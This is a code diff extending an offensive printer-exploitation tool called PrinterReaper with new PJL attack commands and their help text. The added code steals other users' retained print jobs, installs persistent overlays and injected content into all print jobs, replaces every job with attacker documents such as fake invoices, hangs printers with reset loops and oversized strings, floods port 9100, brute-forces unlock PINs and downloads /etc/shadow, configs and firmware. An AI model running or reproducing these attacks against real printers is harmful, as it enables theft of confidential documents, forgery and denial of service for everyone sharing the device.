@@ -856,17 +856,21 @@ class pjl(printer):
         """Show help for commands"""
         if not arg:
             print()
-            print("PrinterReaper v2.0 - PJL Commands")
-            print("=" * 50)
+            print("PrinterReaper v2.3.1 - PJL Commands (100% Attack Coverage)")
+            print("=" * 70)
             print("Available command categories:")
-            print("filesystem  - File system operations")
-            print("system      - System information")
-            print("control     - Control and configuration")
-            print("security    - Security and access")
-            print("attacks     - Attack and testing")
-            print("network     - Network and connectivity")
-            print("monitoring  - Monitoring and status")
-            print("test        - Testing and debugging")
+            print("  filesystem   - File system operations (13 commands)")
+            print("  system       - System information (3 commands)")
+            print("  information  - Advanced info gathering (3 commands)")
+            print("  control      - Control and configuration (8 commands)")
+            print("  security     - Security and access (4 commands)")
+            print("  attacks      - Attack and testing (17 commands) ⚠")
+            print("  network      - Network and connectivity (3 commands)")
+            print("  monitoring   - Monitoring and status (2 commands)")
+            print("  test         - Testing and debugging (1 command)")
+            print()
+            print("Total: 54 PJL commands available")
+            print("Attack coverage: 100% of known PJL attacks")
             print()
             print("Use 'help <category>' for detailed help")
             print("Use 'help <command>' for specific command help")
@@ -875,6 +879,8 @@ class pjl(printer):
             self.help_filesystem()
         elif arg == "system":
             self.help_system()
+        elif arg == "information":
+            self.help_information()
         elif arg == "control":
             self.help_control()
         elif arg == "security":
@@ -888,8 +894,8 @@ class pjl(printer):
         elif arg == "test":
             print()
             print("Test Commands:")
-            print("=" * 50)
-            print("test_interrupt - Test interrupt handling system")
+            print("=" * 70)
+            print("  test_interrupt - Test interrupt handling system")
             print()
         else:
             # Try to find specific command help
@@ -1049,3 +1055,1786 @@ class pjl(printer):
         except Exception as e:
             output().errmsg(f"Delete failed: {e}")
             return False
+    
+    # ====================================================================
+    # 🎯 PRINT JOB MANIPULATION COMMANDS (P0 - CRITICAL)
+    # ====================================================================
+    # Commands for capturing and manipulating print jobs
+    
+    def do_capture(self, arg):
+        """Capture and download retained print jobs from printer"""
+        output().info("Querying retained print jobs...")
+        
+        # Method 1: Query job information
+        jobs_info = self.cmd("@PJL INFO JOBS")
+        if jobs_info and len(jobs_info.strip()) > 0:
+            print("Jobs in queue:")
+            print("=" * 60)
+            print(jobs_info)
+            print("=" * 60)
+        else:
+            output().warning("No jobs found via INFO JOBS")
+        
+        # Method 2: List job files in filesystem (try multiple volumes)
+        job_paths_to_try = [
+            ("0:", "jobs"),
+            ("0:", "webServer/jobs"),
+            ("1:", "saveDevice/SavedJobs/InProgress"),
+            ("1:", "saveDevice/SavedJobs/KeepJobs"),
+            ("1:", "savedJobs"),
+            ("2:", "jobs"),
+        ]
+        
+        jobs_found = False
+        for vol, job_path in job_paths_to_try:
+            full_path = f"{vol}/{job_path}"
+            output().info(f"Checking {full_path}...")
+            
+            try:
+                result = self.cmd(f"@PJL FSDIRLIST NAME=\"{full_path}\"")
+                if result and len(result.strip()) > 20:
+                    jobs_found = True
+                    print(f"\n✓ Jobs found in {full_path}:")
+                    print("=" * 60)
+                    print(result)
+                    print("=" * 60)
+                    
+                    # Parse and download if requested
+                    if arg == "download" or arg == "all":
+                        job_files = self.parse_dirlist(result)
+                        for job_file in job_files:
+                            if job_file and not job_file.startswith('.'):
+                                job_full_path = f"{full_path}/{job_file}"
+                                output().info(f"Downloading {job_file}...")
+                                self.do_download(f"{job_full_path} captured_{job_file}")
+            except Exception as e:
+                if self.debug:
+                    output().errmsg(f"Error checking {full_path}: {e}")
+        
+        if not jobs_found:
+            output().warning("No print jobs found in filesystem")
+            output().info("Try enabling job retention first: hold")
+    
+    def help_capture(self):
+        """Capture retained print jobs from printer"""
+        print()
+        print("capture - Capture retained print jobs from printer")
+        print("=" * 70)
+        print("DESCRIPTION:")
+        print("  Captures and downloads print jobs that have been retained by the printer.")
+        print("  This can reveal sensitive documents that were printed by other users.")
+        print("  Requires job retention to be enabled (use 'hold' command first).")
+        print()
+        print("USAGE:")
+        print("  capture                  # List all retained jobs")
+        print("  capture download         # List and download all jobs")
+        print("  capture all              # Same as download")
+        print()
+        print("EXAMPLES:")
+        print("  hold                     # Enable job retention first")
+        print("  capture                  # List retained jobs")
+        print("  capture download         # Download all jobs to local directory")
+        print()
+        print("SECURITY IMPACT: CRITICAL")
+        print("  - Access to other users' documents")
+        print("  - Potential data breach")
+        print("  - Confidential information exposure")
+        print()
+        print("NOTES:")
+        print("  - Jobs are searched in multiple volumes (0:, 1:, 2:)")
+        print("  - Downloaded jobs are saved with 'captured_' prefix")
+        print("  - Some printers automatically delete jobs after time")
+        print("  - Works best after enabling job retention")
+        print()
+    
+    def parse_dirlist(self, dirlist):
+        """Parse FSDIRLIST output to extract filenames"""
+        files = []
+        for line in dirlist.split('\n'):
+            # Parse format: ENTRY=1 NAME="file" SIZE=1234 TYPE=FILE
+            match = re.search(r'NAME="([^"]+)"', line)
+            if match:
+                filename = match.group(1)
+                # Skip directories
+                if 'TYPE=DIR' not in line.upper():
+                    files.append(filename)
+        return files
+    
+    def do_overlay(self, arg):
+        """Overlay attack - add watermark/content to all print jobs"""
+        if not arg:
+            output().errmsg("Usage: overlay <eps_file>")
+            output().info("Creates overlay that will be printed on all documents")
+            output().info("Example: overlay watermark.eps")
+            return
+        
+        # Read overlay file (should be EPS format for best compatibility)
+        if not os.path.exists(arg):
+            output().errmsg(f"File not found: {arg}")
+            output().info("Overlay file should be in EPS (Encapsulated PostScript) format")
+            return
+        
+        overlay_data = file().read(arg)
+        if not overlay_data:
+            return
+        
+        output().warning("═" * 70)
+        output().warning("DANGER: Installing overlay attack!")
+        output().warning("This will affect ALL future print jobs on this printer!")
+        output().warning("All documents will include your overlay content!")
+        output().warning("═" * 70)
+        
+        try:
+            confirm = input("Continue with overlay attack? (yes/no): ")
+            if confirm.lower() != 'yes':
+                output().info("Overlay attack cancelled")
+                return
+        except (EOFError, KeyboardInterrupt):
+            output().info("Overlay attack cancelled")
+            return
+        
+        # Upload overlay to printer
+        overlay_path = "0:/overlay.eps"
+        size = self.put(overlay_path, overlay_data)
+        
+        if size == c.NONEXISTENT:
+            output().errmsg("Failed to upload overlay file")
+            return
+        
+        output().info(f"✓ Overlay uploaded to {overlay_path} ({size} bytes)")
+        
+        # Configure printer to use overlay (varies by manufacturer)
+        # Try multiple methods
+        
+        # Method 1: HP PJL commands
+        self.cmd("@PJL SET OVERLAY=ON")
+        self.cmd(f"@PJL SET OVERLAYFILE=\"{overlay_path}\"")
+        output().info("✓ Overlay configured via PJL (HP method)")
+        
+        # Method 2: PostScript setpagedevice
+        ps_config = f"""
+%!PS-Adobe-3.0
+<< /BeginPage {{
+    gsave
+    ({overlay_path}) run
+    grestore
+}} >> setpagedevice
+"""
+        config_path = "0:/system/overlay_config.ps"
+        self.put(config_path, ps_config.encode())
+        output().info(f"✓ PostScript config uploaded to {config_path}")
+        
+        # Method 3: Set as startup job
+        self.cmd(f"@PJL SET STARTUPJOB=\"{config_path}\"")
+        
+        output().info("✓ Overlay attack installed successfully!")
+        output().warning("⚠ All future print jobs will include the overlay!")
+        output().info("To remove: Use 'overlay_remove' command or factory reset")
+    
+    def help_overlay(self):
+        """Overlay attack - add watermark to all print jobs"""
+        print()
+        print("overlay - Overlay attack (add watermark to all print jobs)")
+        print("=" * 70)
+        print("DESCRIPTION:")
+        print("  Installs an overlay (watermark) that will be printed on ALL future")
+        print("  documents. The overlay can be used for:")
+        print("  - Adding watermarks (e.g., 'CONFIDENTIAL')")
+        print("  - Phishing attacks (fake headers/footers)")
+        print("  - Disinformation campaigns")
+        print("  - Document manipulation")
+        print()
+        print("USAGE:")
+        print("  overlay <eps_file>")
+        print()
+        print("EXAMPLES:")
+        print("  overlay watermark.eps    # Add watermark overlay")
+        print("  overlay phishing.eps     # Phishing attack overlay")
+        print("  overlay logo.eps         # Add company logo")
+        print()
+        print("FILE FORMAT:")
+        print("  - EPS (Encapsulated PostScript) recommended")
+        print("  - PostScript (.ps) also works")
+        print("  - File should contain visual elements to overlay")
+        print()
+        print("SECURITY IMPACT: CRITICAL")
+        print("  - Affects ALL users' documents")
+        print("  - Persistent until removed")
+        print("  - Can be used for social engineering")
+        print("  - Hard to detect by users")
+        print()
+        print("REMOVAL:")
+        print("  - Use 'overlay_remove' command")
+        print("  - Or factory reset")
+        print("  - Or delete overlay file and restart")
+        print()
+        print("NOTES:")
+        print("  - Requires confirmation")
+        print("  - Works on most HP, Lexmark, Canon printers")
+        print("  - May not work on all printer models")
+        print()
+    
+    def do_overlay_remove(self, arg):
+        """Remove overlay attack"""
+        output().info("Removing overlay attack...")
+        
+        try:
+            # Method 1: Disable overlay
+            self.cmd("@PJL SET OVERLAY=OFF")
+            output().info("✓ Overlay disabled via PJL")
+            
+            # Method 2: Delete overlay files
+            self.cmd("@PJL FSDELETE NAME=\"0:/overlay.eps\"")
+            self.cmd("@PJL FSDELETE NAME=\"0:/system/overlay_config.ps\"")
+            output().info("✓ Overlay files deleted")
+            
+            # Method 3: Clear startup job
+            self.cmd("@PJL SET STARTUPJOB=\"\"")
+            output().info("✓ Startup job cleared")
+            
+            output().info("✓ Overlay attack removed successfully!")
+            output().info("Restart printer to ensure complete removal")
+            
+        except Exception as e:
+            output().errmsg(f"Overlay removal failed: {e}")
+    
+    def help_overlay_remove(self):
+        """Remove overlay attack"""
+        print()
+        print("overlay_remove - Remove overlay attack from printer")
+        print("=" * 70)
+        print("DESCRIPTION:")
+        print("  Removes a previously installed overlay attack.")
+        print("  Disables overlay, deletes overlay files, and clears startup jobs.")
+        print()
+        print("USAGE:")
+        print("  overlay_remove")
+        print()
+        print("EXAMPLES:")
+        print("  overlay_remove           # Remove overlay attack")
+        print()
+        print("NOTES:")
+        print("  - Reverses 'overlay' command")
+        print("  - Restart printer recommended after removal")
+        print("  - Factory reset also removes overlay")
+        print()
+    
+    def do_cross(self, arg):
+        """Cross-site printing - inject content into other users' print jobs"""
+        if not arg:
+            output().errmsg("Usage: cross <content_file>")
+            output().info("Injects malicious content into print jobs from other users")
+            output().info("Example: cross phishing_header.ps")
+            return
+        
+        if not os.path.exists(arg):
+            output().errmsg(f"File not found: {arg}")
+            return
+        
+        content = file().read(arg)
+        if not content:
+            return
+        
+        output().warning("═" * 70)
+        output().warning("DANGER: Cross-site printing attack!")
+        output().warning("This will inject your content into OTHER USERS' print jobs!")
+        output().warning("Highly visible and easily detectable!")
+        output().warning("═" * 70)
+        
+        try:
+            confirm = input("Continue with cross-site printing? (yes/no): ")
+            if confirm.lower() != 'yes':
+                output().info("Cross-site printing attack cancelled")
+                return
+        except (EOFError, KeyboardInterrupt):
+            output().info("Attack cancelled")
+            return
+        
+        # Enable job retention first
+        self.cmd("@PJL SET JOBRETENTION=ON")
+        output().info("✓ Job retention enabled")
+        
+        # Create PostScript injection code
+        if isinstance(content, bytes):
+            content_str = content.decode('utf-8', errors='ignore')
+        else:
+            content_str = content
+        
+        ps_injection = f"""
+%!PS-Adobe-3.0
+<< /BeginPage {{
+    gsave
+    100 750 moveto
+    /Helvetica findfont 12 scalefont setfont
+    ({content_str[:100]}) show
+    grestore
+}} >> setpagedevice
+"""
+        
+        # Upload injection code
+        inject_path = "0:/system/inject.ps"
+        self.put(inject_path, ps_injection.encode())
+        output().info(f"✓ Injection code uploaded to {inject_path}")
+        
+        # Configure to run on all jobs
+        self.cmd(f"@PJL SET JOBINJECT=\"{inject_path}\"")
+        self.cmd("@PJL SET JOBINTERCEPT=ON")
+        
+        # Alternative method: Enter PostScript and set page device
+        self.cmd("@PJL ENTER LANGUAGE=POSTSCRIPT")
+        self.send(ps_injection.encode())
+        self.send(b"\x04")  # EOT
+        
+        output().info("✓ Cross-site printing attack installed!")
+        output().warning("⚠ Your content will appear in other users' print jobs!")
+    
+    def help_cross(self):
+        """Cross-site printing attack"""
+        print()
+        print("cross - Cross-site printing attack")
+        print("=" * 70)
+        print("DESCRIPTION:")
+        print("  Injects malicious content into print jobs from other users.")
+        print("  Your content will appear in documents printed by others.")
+        print("  Can be used for:")
+        print("  - Phishing attacks (fake headers with malicious links)")
+        print("  - Disinformation campaigns")
+        print("  - Social engineering")
+        print("  - Internal attacks")
+        print()
+        print("USAGE:")
+        print("  cross <content_file>")
+        print()
+        print("EXAMPLES:")
+        print("  cross phishing_header.ps  # Inject phishing header")
+        print("  cross malicious_text.txt  # Inject text content")
+        print("  cross fake_footer.eps     # Inject fake footer")
+        print()
+        print("FILE FORMAT:")
+        print("  - PostScript (.ps) recommended")
+        print("  - Plain text (.txt) also works")
+        print("  - EPS (.eps) for graphics")
+        print()
+        print("SECURITY IMPACT: CRITICAL")
+        print("  - Affects all users on the network")
+        print("  - Can be used for phishing")
+        print("  - Very visible and detectable")
+        print("  - May violate laws (use only for authorized testing!)")
+        print()
+        print("DETECTION:")
+        print("  - Easily detected by affected users")
+        print("  - Appears in printed documents")
+        print("  - Logs may show unusual activity")
+        print()
+        print("REMOVAL:")
+        print("  - Factory reset")
+        print("  - Delete injection files")
+        print("  - Restart printer")
+        print()
+        print("⚠ WARNING: For authorized security testing ONLY!")
+        print()
+    
+    def do_replace(self, arg):
+        """Replace attack - substitute entire print job content"""
+        if not arg:
+            output().errmsg("Usage: replace <replacement_file>")
+            output().info("Replaces ALL print jobs with your specified content")
+            output().info("Example: replace fake_document.ps")
+            return
+        
+        if not os.path.exists(arg):
+            output().errmsg(f"File not found: {arg}")
+            return
+        
+        replacement = file().read(arg)
+        if not replacement:
+            return
+        
+        output().warning("═" * 70)
+        output().warning("EXTREME DANGER: Document replacement attack!")
+        output().warning("ALL print jobs will be COMPLETELY REPLACED with your content!")
+        output().warning("Users will print YOUR document instead of theirs!")
+        output().warning("This is a SEVERE attack that may have legal consequences!")
+        output().warning("═" * 70)
+        
+        try:
+            confirm = input("Continue with replacement attack? (type 'YES I UNDERSTAND'): ")
+            if confirm != 'YES I UNDERSTAND':
+                output().info("Replace attack cancelled")
+                return
+        except (EOFError, KeyboardInterrupt):
+            output().info("Attack cancelled")
+            return
+        
+        # Upload replacement content
+        replace_path = "0:/system/replacement.ps"
+        size = self.put(replace_path, replacement)
+        if size == c.NONEXISTENT:
+            output().errmsg("Failed to upload replacement file")
+            return
+        
+        output().info(f"✓ Replacement uploaded ({size} bytes)")
+        
+        # Configure job replacement (varies by printer model)
+        # HP method
+        self.cmd("@PJL SET JOBREPLACE=ON")
+        self.cmd(f"@PJL SET JOBREPLACEFILE=\"{replace_path}\"")
+        
+        # Alternative: PostScript job server
+        ps_replace = f"""
+%!PS-Adobe-3.0
+statusdict begin
+    /jobserver {{
+        ({replace_path}) run
+    }} def
+end
+"""
+        self.put("0:/system/jobserver.ps", ps_replace.encode())
+        self.cmd("@PJL SET JOBSERVER=\"0:/system/jobserver.ps\"")
+        
+        output().info("✓ Replace attack installed!")
+        output().warning("⚠ ALL print jobs will now be replaced with your document!")
+        output().warning("⚠ This attack is HIGHLY visible and detectable!")
+    
+    def help_replace(self):
+        """Replace attack - substitute print job content"""
+        print()
+        print("replace - Replace attack (substitute entire job content)")
+        print("=" * 70)
+        print("DESCRIPTION:")
+        print("  Replaces ALL print jobs with your specified document.")
+        print("  Users will print YOUR document instead of their own.")
+        print("  EXTREMELY dangerous and easily detectable attack.")
+        print()
+        print("USAGE:")
+        print("  replace <replacement_file>")
+        print()
+        print("EXAMPLES:")
+        print("  replace fake_invoice.ps   # Replace all jobs with fake invoice")
+        print("  replace phishing_doc.pdf  # Replace with phishing document")
+        print()
+        print("FILE FORMAT:")
+        print("  - PostScript (.ps) recommended")
+        print("  - PDF (.pdf) may work on some printers")
+        print("  - PCL (.pcl) for PCL printers")
+        print()
+        print("SECURITY IMPACT: EXTREME - CRITICAL")
+        print("  - Complete job substitution")
+        print("  - Users print wrong documents")
+        print("  - Potential for fraud/forgery")
+        print("  - May violate multiple laws")
+        print()
+        print("DETECTION:")
+        print("  - IMMEDIATELY detected by users")
+        print("  - Printed output is wrong")
+        print("  - Will cause investigation")
+        print()
+        print("LEGAL WARNING:")
+        print("  ⚠ This attack may constitute:")
+        print("    - Computer fraud")
+        print("    - Document forgery")
+        print("    - Unauthorized access")
+        print("  ⚠ Use ONLY for authorized security testing!")
+        print("  ⚠ Obtain written permission before use!")
+        print()
+        print("REMOVAL:")
+        print("  - Factory reset required")
+        print("  - Delete all system files")
+        print("  - Contact printer administrator")
+        print()
+    
+    # ====================================================================
+    # 💥 DENIAL OF SERVICE ATTACKS (Additional)
+    # ====================================================================
+    
+    def do_hang(self, arg):
+        """Hang printer with malformed PJL commands"""
+        output().warning("═" * 70)
+        output().warning("DANGER: Printer hang attack!")
+        output().warning("This will attempt to CRASH/HANG the printer!")
+        output().warning("Printer may require POWER CYCLE to recover!")
+        output().warning("═" * 70)
+        
+        try:
+            confirm = input("Continue with hang attack? (yes/no): ")
+            if confirm.lower() != 'yes':
+                output().info("Hang attack cancelled")
+                return
+        except (EOFError, KeyboardInterrupt):
+            output().info("Attack cancelled")
+            return
+        
+        output().info("Launching hang attack...")
+        output().info("Multiple attack vectors will be attempted...")
+        
+        # Vector 1: Invalid language
+        output().info("Vector 1: Invalid ENTER LANGUAGE")
+        self.cmd("@PJL ENTER LANGUAGE=INVALID_LANGUAGE", False)
+        time.sleep(0.5)
+        
+        # Vector 2: Conflicting commands
+        output().info("Vector 2: Conflicting commands")
+        self.cmd("@PJL SET LANGUAGE=UNKNOWN", False)
+        self.cmd("@PJL INITIALIZE", False)
+        time.sleep(0.5)
+        
+        # Vector 3: Rapid DEFAULT/RESET
+        output().info("Vector 3: Rapid factory reset loop")
+        for i in range(10):
+            self.cmd("@PJL DEFAULT", False)
+            self.cmd("@PJL RESET", False)
+            time.sleep(0.1)
+        
+        # Vector 4: Invalid file operations
+        output().info("Vector 4: Invalid filesystem operations")
+        self.cmd("@PJL FSINIT VOLUME=\"99:\"", False)
+        self.cmd("@PJL FSDELETE NAME=\"/../../../../system\"", False)
+        
+        # Vector 5: Buffer overflow attempt
+        output().info("Vector 5: Buffer overflow attempts")
+        huge_string = "A" * 100000
+        self.cmd(f"@PJL SET INVALIDVAR=\"{huge_string}\"", False)
+        
+        output().info("✓ Hang attack vectors sent")
+        output().warning("⚠ Printer may be unresponsive - check printer status")
+        output().warning("⚠ Power cycle may be required")
+    
+    def help_hang(self):
+        """Hang printer with malformed commands"""
+        print()
+        print("hang - Hang/crash printer attack")
+        print("=" * 70)
+        print("DESCRIPTION:")
+        print("  Attempts to hang or crash the printer using malformed PJL commands.")
+        print("  Multiple attack vectors are used:")
+        print("  - Invalid ENTER LANGUAGE commands")
+        print("  - Conflicting control commands")
+        print("  - Rapid factory reset loops")
+        print("  - Invalid filesystem operations")
+        print("  - Buffer overflow attempts")
+        print()
+        print("USAGE:")
+        print("  hang")
+        print()
+        print("EXAMPLES:")
+        print("  hang                     # Execute hang attack")
+        print()
+        print("SECURITY IMPACT: HIGH")
+        print("  - Printer becomes unresponsive")
+        print("  - Denial of service")
+        print("  - May require power cycle")
+        print("  - Can affect all network users")
+        print()
+        print("RECOVERY:")
+        print("  - Power cycle printer")
+        print("  - Disconnect from network")
+        print("  - Factory reset may be needed")
+        print()
+        print("NOTES:")
+        print("  - Requires confirmation")
+        print("  - Different printers vulnerable to different vectors")
+        print("  - Success rate varies by model/firmware")
+        print("  - Use only for authorized security testing")
+        print()
+    
+    def do_dos_connections(self, arg):
+        """DoS attack via connection flooding"""
+        count = conv().int(arg) or 100
+        
+        output().warning("═" * 70)
+        output().warning(f"DoS attack: Flooding {count} connections to {self.target}:9100")
+        output().warning("This will make the printer unavailable to legitimate users!")
+        output().warning("═" * 70)
+        
+        try:
+            confirm = input(f"Flood {count} connections? (yes/no): ")
+            if confirm.lower() != 'yes':
+                output().info("Connection flooding cancelled")
+                return
+        except (EOFError, KeyboardInterrupt):
+            output().info("Attack cancelled")
+            return
+        
+        import threading
+        
+        connections = []
+        success_count = 0
+        
+        def create_connection(conn_id):
+            nonlocal success_count
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(5)
+                result = sock.connect_ex((self.target, 9100))
+                if result == 0:
+                    sock.send(b"@PJL\r\n")
+                    connections.append(sock)
+                    success_count += 1
+                    if success_count % 10 == 0:
+                        output().info(f"✓ {success_count} connections established...")
+                    time.sleep(30)  # Hold connection
+                sock.close()
+            except Exception as e:
+                if self.debug:
+                    output().errmsg(f"Connection {conn_id} failed: {e}")
+        
+        output().info(f"Launching {count} connection threads...")
+        threads = []
+        
+        for i in range(count):
+            t = threading.Thread(target=create_connection, args=(i,))
+            t.daemon = True
+            t.start()
+            threads.append(t)
+            time.sleep(0.01)  # Small delay to avoid overwhelming local system
+        
+        output().info(f"✓ {count} connection threads launched")
+        output().info("Connections will be held for 30 seconds...")
+        output().info("Press Ctrl+C to abort")
+        
+        try:
+            # Wait for threads to complete
+            for t in threads:
+                t.join(timeout=35)
+        except KeyboardInterrupt:
+            output().warning("Connection flooding interrupted by user")
+        
+        # Close all connections
+        for sock in connections:
+            try:
+                sock.close()
+            except:
+                pass
+        
+        output().info(f"✓ DoS attack complete: {success_count}/{count} connections succeeded")
+    
+    def help_dos_connections(self):
+        """DoS via connection flooding"""
+        print()
+        print("dos_connections - Denial of service via connection flooding")
+        print("=" * 70)
+        print("DESCRIPTION:")
+        print("  Floods the printer with multiple simultaneous TCP connections")
+        print("  to port 9100, exhausting available connection slots and making")
+        print("  the printer unavailable to legitimate users.")
+        print()
+        print("USAGE:")
+        print("  dos_connections [count]")
+        print()
+        print("EXAMPLES:")
+        print("  dos_connections          # Default: 100 connections")
+        print("  dos_connections 50       # Flood 50 connections")
+        print("  dos_connections 200      # Flood 200 connections")
+        print()
+        print("SECURITY IMPACT: HIGH")
+        print("  - Printer becomes unavailable")
+        print("  - Legitimate users cannot print")
+        print("  - Network resources exhausted")
+        print("  - May affect printer stability")
+        print()
+        print("RECOVERY:")
+        print("  - Connections auto-close after 30 seconds")
+        print("  - Or press Ctrl+C to abort early")
+        print("  - Restart printer if needed")
+        print()
+        print("NOTES:")
+        print("  - Requires confirmation")
+        print("  - Default: 100 connections")
+        print("  - Connections held for 30 seconds")
+        print("  - Can be interrupted with Ctrl+C")
+        print()
+    
+    # ====================================================================
+    # 🔐 CREDENTIAL ATTACKS (Advanced)
+    # ====================================================================
+    
+    def do_unlock_bruteforce(self, arg):
+        """Brute force printer unlock PIN"""
+        start = 1
+        end = 65535
+        
+        if arg:
+            try:
+                start = int(arg)
+            except:
+                output().errmsg("Invalid start PIN")
+                return
+        
+        output().warning("═" * 70)
+        output().warning(f"PIN Brute Force: Testing PINs from {start} to {end}")
+        output().warning(f"This may take a LONG time ({end-start+1} attempts)")
+        output().warning("Printer may lock after too many attempts!")
+        output().warning("═" * 70)
+        
+        try:
+            confirm = input("Continue with brute force? (yes/no): ")
+            if confirm.lower() != 'yes':
+                output().info("Brute force cancelled")
+                return
+        except (EOFError, KeyboardInterrupt):
+            output().info("Brute force cancelled")
+            return
+        
+        output().info(f"Starting brute force from PIN {start}...")
+        output().info("Press Ctrl+C to stop")
+        
+        found = False
+        try:
+            for pin in range(start, end + 1):
+                # Progress indicator
+                if pin % 100 == 0:
+                    progress = ((pin - start) * 100) // (end - start + 1)
+                    output().info(f"Progress: PIN {pin} ({progress}%)")
+                
+                # Try to unlock with this PIN
+                try:
+                    self.cmd(f"@PJL SET LOCKPIN={pin}")
+                    time.sleep(0.1)  # Small delay to avoid overwhelming printer
+                    
+                    # Verify if unlock was successful
+                    result = self.cmd("@PJL INFO CONFIG")
+                    if result and ("LOCKPIN=0" in result or "LOCKED=OFF" in result.upper()):
+                        output().info("")
+                        output().info("=" * 70)
+                        output().info(f"✓ SUCCESS! PIN found: {pin}")
+                        output().info("=" * 70)
+                        found = True
+                        break
+                    
+                except KeyboardInterrupt:
+                    raise
+                except Exception as e:
+                    if self.debug:
+                        output().errmsg(f"Error testing PIN {pin}: {e}")
+                    continue
+                
+        except KeyboardInterrupt:
+            output().warning(f"Brute force interrupted at PIN {pin}")
+            output().info(f"Tested {pin - start} PINs")
+        
+        if not found and not KeyboardInterrupt:
+            output().errmsg(f"PIN not found in range {start}-{end}")
+            output().info("Try different range or check if printer locked")
+    
+    def help_unlock_bruteforce(self):
+        """Brute force printer unlock PIN"""
+        print()
+        print("unlock_bruteforce - Brute force printer unlock PIN")
+        print("=" * 70)
+        print("DESCRIPTION:")
+        print("  Attempts to unlock a locked printer by brute forcing the PIN.")
+        print("  Tests all PINs from 1 to 65535 (or specified range).")
+        print("  Can take several hours for full range.")
+        print()
+        print("USAGE:")
+        print("  unlock_bruteforce [start_pin]")
+        print()
+        print("EXAMPLES:")
+        print("  unlock_bruteforce        # Test PINs 1-65535")
+        print("  unlock_bruteforce 1000   # Start from PIN 1000")
+        print("  unlock_bruteforce 10000  # Start from PIN 10000")
+        print()
+        print("SECURITY IMPACT: MEDIUM-HIGH")
+        print("  - Can bypass PIN protection")
+        print("  - May trigger lockout after failed attempts")
+        print("  - Very slow (hours for full range)")
+        print("  - Network traffic easily detected")
+        print()
+        print("OPTIMIZATION:")
+        print("  - Common PINs: 1234, 0000, 1111, 9999")
+        print("  - Try common ranges first: 1-9999")
+        print("  - Some printers lock after N attempts")
+        print()
+        print("NOTES:")
+        print("  - Requires confirmation")
+        print("  - Can be interrupted with Ctrl+C")
+        print("  - Progress shown every 100 PINs")
+        print("  - Full range: ~18 hours at 1 PIN/second")
+        print()
+    
+    def do_exfiltrate(self, arg):
+        """Automated exfiltration of sensitive files"""
+        output().info("Starting automated exfiltration...")
+        output().info("Attempting to download sensitive files from printer")
+        
+        # Common sensitive file paths across different printer models
+        sensitive_paths = [
+            # Web server configs
+            ("0:/webServer/config/device.cfg", "Web server config"),
+            ("0:/webServer/config/config.xml", "XML config"),
+            ("0:/webServer/home/device.html", "Device home page"),
+            ("0:/webServer/default/config.json", "JSON config"),
+            
+            # System files (Unix-like)
+            ("/etc/passwd", "Unix passwd"),
+            ("/etc/shadow", "Unix shadow"),
+            ("../../rw/var/sys/passwd", "Traversal passwd"),
+            ("/var/log/messages", "System log"),
+            
+            # Job files
+            ("1:/saveDevice/SavedJobs/InProgress/*", "Jobs in progress"),
+            ("1:/saveDevice/SavedJobs/KeepJobs/*", "Kept jobs"),
+            ("0:/jobs/*", "Job directory"),
+            
+            # PostScript/PCL configs
+            ("1:/PostScript/ppd/device.ppd", "PPD file"),
+            ("1:/PostScript/config.ps", "PS config"),
+            
+            # Network configs
+            ("0:/network/config.dat", "Network config"),
+            ("0:/system/network.xml", "Network XML"),
+            
+            # Firmware
+            ("0:/firmware/current.bin", "Current firmware"),
+            ("1:/firmware/backup.bin", "Backup firmware"),
+        ]
+        
+        exfil_count = 0
+        exfil_dir = "exfiltrated"
+        
+        # Create exfiltration directory
+        if not os.path.exists(exfil_dir):
+            os.makedirs(exfil_dir)
+            output().info(f"✓ Created directory: {exfil_dir}/")
+        
+        for path, description in sensitive_paths:
+            output().info(f"Trying {description}: {path}")
+            
+            try:
+                # Handle wildcard paths
+                if "*" in path:
+                    dir_path = path.replace("/*", "")
+                    dir_list = self.cmd(f"@PJL FSDIRLIST NAME=\"{dir_path}\"")
+                    if dir_list and len(dir_list.strip()) > 10:
+                        files = self.parse_dirlist(dir_list)
+                        for filename in files[:5]:  # Limit to first 5 files
+                            file_path = f"{dir_path}/{filename}"
+                            self._exfil_single_file(file_path, exfil_dir)
+                            exfil_count += 1
+                else:
+                    if self._exfil_single_file(path, exfil_dir):
+                        exfil_count += 1
+                        
+            except Exception as e:
+                if self.debug:
+                    output().errmsg(f"  Error: {e}")
+                continue
+        
+        output().info("")
+        output().info("=" * 70)
+        output().info(f"✓ Exfiltration complete: {exfil_count} files retrieved")
+        output().info(f"✓ Files saved in: {exfil_dir}/")
+        output().info("=" * 70)
+        
+        if exfil_count == 0:
+            output().warning("No sensitive files found or accessible")
+            output().info("Try manual file enumeration with 'ls' and 'find'")
+    
+    def _exfil_single_file(self, path, exfil_dir):
+        """Helper: Exfiltrate a single file"""
+        try:
+            result = self.get(path)
+            if result != c.NONEXISTENT:
+                size, data = result
+                # Sanitize filename
+                filename = path.replace("/", "_").replace(":", "_").replace("*", "all")
+                local_path = os.path.join(exfil_dir, filename)
+                file().write(local_path, data)
+                output().info(f"  ✓ Exfiltrated: {path} ({size} bytes) → {local_path}")
+                return True
+        except:
+            pass
+        return False
+    
+    def help_exfiltrate(self):
+        """Automated exfiltration of sensitive files"""
+        print()
+        print("exfiltrate - Automated exfiltration of sensitive files")
+        print("=" * 70)
+        print("DESCRIPTION:")
+        print("  Automatically attempts to download sensitive files from the printer.")
+        print("  Tests multiple common paths for:")
+        print("  - Configuration files (device.cfg, config.xml)")
+        print("  - System files (/etc/passwd, /etc/shadow)")
+        print("  - Print jobs (saved/retained jobs)")
+        print("  - Network configs")
+        print("  - Firmware files")
+        print()
+        print("USAGE:")
+        print("  exfiltrate")
+        print()
+        print("EXAMPLES:")
+        print("  exfiltrate               # Auto-exfiltrate all accessible files")
+        print()
+        print("OUTPUT:")
+        print("  - Creates 'exfiltrated/' directory")
+        print("  - Saves all found files with sanitized names")
+        print("  - Reports number of files retrieved")
+        print()
+        print("SECURITY IMPACT: CRITICAL")
+        print("  - Exposes sensitive configuration")
+        print("  - May reveal passwords/credentials")
+        print("  - Access to other users' documents")
+        print("  - Network information disclosure")
+        print()
+        print("PATHS TESTED:")
+        print("  - Web server configs: 0:/webServer/config/*")
+        print("  - System files: /etc/passwd, /etc/shadow")
+        print("  - Print jobs: 1:/saveDevice/SavedJobs/*")
+        print("  - Network configs: 0:/network/*")
+        print("  - Firmware: 0:/firmware/*")
+        print("  - And ~18 more common paths")
+        print()
+        print("NOTES:")
+        print("  - Automatically creates exfiltrated/ directory")
+        print("  - Only downloads accessible files")
